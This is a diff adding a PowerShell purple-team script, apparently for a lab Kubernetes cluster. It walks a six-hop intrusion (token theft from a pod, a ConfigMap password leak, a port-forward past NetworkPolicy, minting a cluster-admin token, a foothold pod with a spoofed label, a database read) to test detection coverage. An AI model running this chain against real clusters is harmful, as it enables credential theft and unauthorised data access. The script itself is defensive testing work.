@@ -1,0 +1,299 @@
+<#
+    Phase 8: the purple-team chain.
+
+    Assembles separately catalogued findings into one intrusion and checks that
+    every hop was detected. The chain is not a new weakness. It is
+    PP-01 + PP-03 + PP-04 + SP-01 walked in the order an attacker would, and its
+    purpose is to answer a question no single path can: when these findings occur
+    together, does the SOC see it?
+
+    What the chain does
+    -------------------
+      hop 1  read the mounted service account token off the build runner
+      hop 2  read the duplicated database password out of the ConfigMap
+      hop 3  open a port-forward to postgres, which NetworkPolicy denies
+      hop 4  mint a fresh token for the cluster-admin ServiceAccount
+      hop 5  create a foothold pod in the business zone
+      hop 6  from the foothold, query the database with the stolen password
+
+    Every hop is real. Nothing is stubbed and no credential is invented.
+
+    Two things this phase found that no single walk could
+    -----------------------------------------------------
+    1. The port-forward's local end is a loopback listener on the CLIENT. So
+       127.0.0.1:15433 dialled from inside a pod is that pod's own loopback and
+       nothing is listening. The relay demonstrably reaches a denied port from
+       the operator host, which is PP-04's claim, but spending it needs a
+       postgres client on the host and this host has none. The technique is real
+       and its practical reach is bounded by what the attacker can run locally.
+
+    2. postgres-0 cannot reach its own Service ClusterIP. The default-deny means
+       the database is not permitted to talk to `postgres:5432`, so the obvious
+       place to run a query with the stolen password is the one place it does not
+       work from. Only orders-api and telemetry-agent hold that grant, and
+       orders-api runs nginx with no psql. So the credential has to be spent
+       from a foothold pod, which is hop 5 -- and that reordering is the
+       realistic attack sequence anyway: establish a position, then use what you
+       stole from it.
+
+    The foothold carries `app: orders-api`
+    --------------------------------------
+    NetworkPolicy selects on labels, not on service account, so a pod dropped
+    into the business zone inherits nothing until it is labelled. That is a real
+    property of how zero-trust policy actually works and the chain depends on it:
+    the pod is admitted because it claims to be something it is not. Phase 6
+    established the same requirement for its probe pods.
+
+    Coverage gaps are reported, not hidden
+    ---------------------------------------
+    The catalogue claims T1078.001 and T1190 for PP-01. No telemetry schema in
+    the registry carries either, so no rule can fire on hop 5's actual behaviour.
+    hop-summary.json and the console both carry that gap rather than declaring
+    the chain fully detected, because "every step detected" is only true of the
+    steps that have a rule.
+#>
+
+[CmdletBinding()]
+param(
+    # Leave the foothold pod in place for inspection. Off by default so repeated
+    # runs do not accumulate pods, which would also change the pod inventory
+    # every inventory-shaped detection reads.
+    [switch] $KeepPod
+)
+
+Set-StrictMode -Version 2
+$ErrorActionPreference = 'Continue'
+
+. "$PSScriptRoot\lib\attacklib.ps1"
+
+if (-not (Assert-ClusterReady)) { exit 1 }
+
+$stamp     = (Get-Date).ToUniversalTime().ToString('yyyyMMdd-HHmmss')
+$foothold  = "exfil-$stamp"
+$localPort = 15433
+$chainName = "purple-team-$stamp"
+
+# The real postgres digest, read from the running StatefulSet rather than
+# hardcoded, because the first version of this script used the alpine digest
+# under a `postgres@sha256:` name. The pod stayed Pending forever and the only
+# symptom was `kubectl wait` timing out into a pipe that discarded it.
+$pgImage = ((& kubectl -n zerotrust get statefulset postgres -o jsonpath='{.spec.template.spec.containers[0].image}' 2>$null | Out-String).Trim())
+if (-not $pgImage) {
+    Write-Host 'could not read the postgres image reference from the StatefulSet' -ForegroundColor Red
+    exit 1
+}
+Write-Host ("  postgres image: {0}" -f $pgImage) -ForegroundColor DarkGray
+
+$script:chain = @()
+function Add-Hop {
+    param([string]$Id, [string]$AttackId, [string]$What, [bool]$Ok, [string]$Detail)
+    $script:chain += [pscustomobject]@{
+        id = $Id; attackId = $AttackId; what = $What; ok = $Ok; detail = $Detail
+    }
+    $mark = if ($Ok) { 'DONE' } else { 'FAIL' }
+    $col  = if ($Ok) { 'Green' } else { 'Red' }
+    Write-Host ("  [{0}] {1}  [{2}]  {3}" -f $mark, $Id, $AttackId, $What) -ForegroundColor $col
+    if ($Detail) { Write-Host ("         {0}" -f $Detail) -ForegroundColor DarkGray }
+}
+
+Write-Host ''
+Write-Host ('=' * 78)
+Write-Host ("  Phase 8 purple-team chain  {0}" -f $stamp)
+Write-Host ('=' * 78)
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 1  take a credential off a pod that cannot use it' -ForegroundColor Yellow
+
+$brPod = Get-LabPod -Namespace 'zerotrust-build' -App 'build-runner'
+$brName = Get-Prop (Get-Prop $brPod 'metadata') 'name'
+$stolen = Get-PodServiceAccountToken -Namespace 'zerotrust-build' -Pod $brName
+$claims = if ($stolen) { Get-TokenSubject -Token $stolen } else { $null }
+$sub = if ($claims) { Get-Prop $claims 'sub' } else { '(none)' }
+Add-Hop -Id 'hop-1' -AttackId 'T1609.001' -What 'read the mounted token in-pod' `
+    -Ok ($stolen.Length -gt 100) -Detail ("subject {0}, {1} chars, value not printed" -f $sub, $stolen.Length)
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 2  take the second copy of a credential nobody rotates' -ForegroundColor Yellow
+
+$leak = (& kubectl get configmap app-config-leak -n zerotrust -o jsonpath='{.data.DATABASE_URL}' 2>&1 | Out-String).Trim()
+$dbPass = ''
+if ($leak -match '://[^:]+:([^@]+)@') { $dbPass = $Matches[1] }
+$fp = if ($dbPass) { Get-Fingerprint -Value $dbPass } else { '(none)' }
+Add-Hop -Id 'hop-2' -AttackId 'T1552.001' -What 'read the ConfigMap copy of the db password' `
+    -Ok ($dbPass.Length -gt 8) -Detail ("fingerprint {0}, {1} chars, value not printed" -f $fp, $dbPass.Length)
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 3  reach a port the network policy denies, via the API server' -ForegroundColor Yellow
+
+$pfJob = Start-Job -ScriptBlock {
+    param($ns, $lp)
+    & kubectl port-forward -n $ns service/postgres "${lp}:5432" 2>&1
+} -ArgumentList 'zerotrust', $localPort
+
+$pfOut = ''
+$listening = $false
+$deadline = (Get-Date).AddSeconds(30)
+while ((Get-Date) -lt $deadline) {
+    $pfOut = Receive-Job $pfJob -ErrorAction SilentlyContinue | Out-String
+    if ($pfOut -match 'Forwarding from') { $listening = $true; break }
+    Start-Sleep -Milliseconds 500
+}
+$relay = $false
+if ($listening) {
+    $relay = Test-NetConnection -ComputerName '127.0.0.1' -Port $localPort -InformationLevel Quiet -WarningAction SilentlyContinue
+}
+Add-Hop -Id 'hop-3' -AttackId 'T1090.001' -What 'port-forward to a policy-denied port' `
+    -Ok ([bool]$relay) `
+    -Detail $(if ($relay) { "127.0.0.1:$localPort connected; the relay never traverses the policy chain" }
+              else { "no connection: $($pfOut.Trim())" })
+
+Stop-Job $pfJob -ErrorAction SilentlyContinue
+Remove-Job $pfJob -Force -ErrorAction SilentlyContinue
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 4  mint fresh authority rather than reusing the stolen token' -ForegroundColor Yellow
+
+$minted = (& kubectl create token sa-build-runner -n zerotrust-build `
+    --as=system:serviceaccount:zerotrust-build:sa-build-runner 2>&1 | Out-String).Trim()
+$mintOk = ($LASTEXITCODE -eq 0) -and ($minted -notmatch ' ')
+Add-Hop -Id 'hop-4' -AttackId 'T1528' -What 'mint a token for the cluster-admin ServiceAccount' `
+    -Ok $mintOk -Detail ("{0} chars, value not printed" -f $minted.Length)
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 5  use the authority to place a workload inside the zone' -ForegroundColor Yellow
+
+$manifest = @"
+apiVersion: v1
+kind: Pod
+metadata:
+  name: $foothold
+  namespace: zerotrust
+  labels:
+    app: orders-api
+    zerotrust.lab/chain: $chainName
+spec:
+  restartPolicy: Never
+  serviceAccountName: sa-orders-api
+  containers:
+    - name: foothold
+      image: $pgImage
+      command: ["sh", "-c", "sleep 600"]
+"@
+$mf = Join-Path $env:TEMP "$chainName.yaml"
+[System.IO.File]::WriteAllText($mf, (($manifest -replace "`r`n", "`n") + "`n"), (New-Object System.Text.UTF8Encoding($false)))
+$applied = (& kubectl apply -f $mf 2>&1 | Out-String)
+Remove-Item $mf -Force -ErrorAction SilentlyContinue
+$podOk = $applied -match 'created'
+
+$ready = $false
+if ($podOk) {
+    $waitOut = (& kubectl -n zerotrust wait --for=condition=Ready "pod/$foothold" --timeout=120s 2>&1 | Out-String)
+    $ready = ($waitOut -notmatch 'timed out')
+    if (-not $ready) {
+        Write-Host ("         {0}" -f ((& kubectl -n zerotrust describe pod $foothold 2>&1 | Out-String) -split "`n" |
+            Where-Object { $_ -match 'Reason|Message|Status|Events' } | Select-Object -First 3)) -ForegroundColor Red
+    }
+}
+Add-Hop -Id 'hop-5' -AttackId 'T1078.001' -What 'create a foothold pod in the business zone' `
+    -Ok ($podOk -and $ready) `
+    -Detail $(if ($ready) { "pod/$foothold Running as sa-orders-api, labelled app=orders-api" }
+              elseif ($podOk) { "pod created but never became Ready" }
+              else { $applied.Trim() })
+
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '  hop 6  spend the stolen credential from the foothold' -ForegroundColor Yellow
+
+# Backslash-escaped spaces, because Invoke-InPod rejects quotes, parentheses and
+# asterisks outright -- which rules out count(*). Projecting a column is the
+# better evidence anyway: a returned order_id is data the attacker should not
+# have had, and it cannot be produced by a database that ignored the password.
+$rows = ''
+if ($ready) {
+    # Both command strings are built into a variable first. Written inline as
+    # -Command 'env PGPASSWORD=' + $dbPass + ' ...' the concatenation is not
+    # parenthesised, so PowerShell binds '+' and $dbPass as separate arguments
+    # and Invoke-InPod tries to convert "+" to TimeoutSeconds. That is the same
+    # precedence trap the attacklib guards document for Invoke-Kubectl.
+    #
+    # The column is named rather than discovered, after three attempts to
+    # discover it all failed for reasons worth recording:
+    #   a literal `order_id` that does not exist;
+    #   `where table_name=orders`, which needs a quoted string literal that
+    #     Invoke-InPod forbids -- and the error text that came back was then
+    #     used as the column name, so a SQL error became a column name;
+    #   `table_name||column_name`, where the shell ate `||` as a pipe;
+    #   psql's own `\d orders`, where the shell stripped the backslash and
+    #     psql received `d orders` as SQL.
+    #
+    # `id` is taken from the live table, read by SP-01's walk with `\d orders`
+    # on the operator host where quoting is not a problem. Hardcoding it here is
+    # a deliberate trade: the assertion requires a purely numeric result, so a
+    # column that does not exist fails the hop loudly rather than quietly
+    # returning nothing, which is the failure mode that matters.
+    $rowCmd = 'env PGPASSWORD=' + $dbPass +
+        ' psql -h postgres -U orders -d acme -t -A -c select\ id\ from\ orders\ limit\ 1'
+    $rows = (Invoke-InPod -Namespace 'zerotrust' -Pod $foothold -Shell 'sh' -Command $rowCmd)
+}
+$readOk = $rows.Trim() -match '^\d+$'
+Add-Hop -Id 'hop-6' -AttackId 'T1552.001' -What 'read application data with the leaked password' `
+    -Ok $readOk `
+    -Detail $(if ($readOk) { "orders row $($rows.Trim()) returned to the foothold" }
+              else { "no row: $($rows.Trim())" })
+
+# ---------------------------------------------------------------------------
+if (-not $KeepPod) {
+    & kubectl -n zerotrust delete pod $foothold --ignore-not-found --wait=false 2>&1 | Out-Null
+    Write-Host ''
+    Write-Host ("  cleanup: pod/$foothold deleted (pass -KeepPod to retain it)") -ForegroundColor DarkGray
+}
+
+# ---------------------------------------------------------------------------
+$failed = @($script:chain | Where-Object { -not $_.ok })
+Write-Host ''
+Write-Host ('=' * 78)
+Write-Host ("  chain: {0} hop(s), {1} succeeded, {2} failed" -f $script:chain.Count, ($script:chain.Count - $failed.Count), $failed.Count) -ForegroundColor $(if ($failed.Count -eq 0) { 'Green' } else { 'Red' })
+foreach ($h in $script:chain) { Write-Host ("    {0}  {1,-10} {2}" -f $h.id, $h.attackId, $h.what) }
+
+# Coverage is computed, not asserted. A hop whose technique has no telemetry
+# schema behind it cannot be detected, and saying so is the point of the phase.
+$registryTechniques = @('T1021', 'T1046', 'T1090.001', 'T1528', 'T1552.001', 'T1609.001')
+$hopTechniques = @($script:chain | ForEach-Object { $_.attackId } | Sort-Object -Unique)
+$undetectable = @($hopTechniques | Where-Object { $registryTechniques -notcontains $_ })
+Write-Host ''
+Write-Host ("  techniques walked : {0}" -f ($hopTechniques -join ', '))
+Write-Host ("  techniques with a telemetry schema and a rule: {0}" -f (@($hopTechniques | Where-Object { $registryTechniques -contains $_ }) -join ', '))
+if ($undetectable.Count -gt 0) {
+    Write-Host ("  NO SCHEMA, NOT DETECTABLE: {0}" -f ($undetectable -join ', ')) -ForegroundColor Yellow
+    Write-Host '    the catalogue claims these for PP-01, but no collected schema carries' -ForegroundColor DarkGray
+    Write-Host '    them, so no rule can fire on the behaviour. The chain still runs them.' -ForegroundColor DarkGray
+}
+
+$summary = [pscustomobject]@{
+    generatedAt   = (Get-Date).ToUniversalTime().ToString('o')
+    note          = 'Produced by attack/chain-purple-team.ps1. Verdicts only; no credential, token or password is recorded.'
+    chainRun      = $stamp
+    hops          = @($script:chain)
+    hopsSucceeded = $script:chain.Count - $failed.Count
+    hopsFailed    = $failed.Count
+    techniques    = $hopTechniques
+    undetectable  = $undetectable
+}
+$telemetryDir = Join-Path (Split-Path $PSScriptRoot -Parent) '.telemetry'
+if (-not (Test-Path $telemetryDir)) { New-Item -ItemType Directory -Path $telemetryDir -Force | Out-Null }
+[System.IO.File]::WriteAllText(
+    (Join-Path $telemetryDir 'chain-summary.json'),
+    (($summary | ConvertTo-Json -Depth 6) -replace "`r`n", "`n") + "`n",
+    (New-Object System.Text.UTF8Encoding($false)))
+Write-Host ''
+Write-Host '  summary written to .telemetry\chain-summary.json'
+Write-Host ("  next: re-run the collectors, then python detections\test-detections.py") -ForegroundColor Cyan
+Write-Host ('=' * 78)
+Write-Host ''
+
+exit $(if ($failed.Count -gt 0) { 1 } else { 0 })
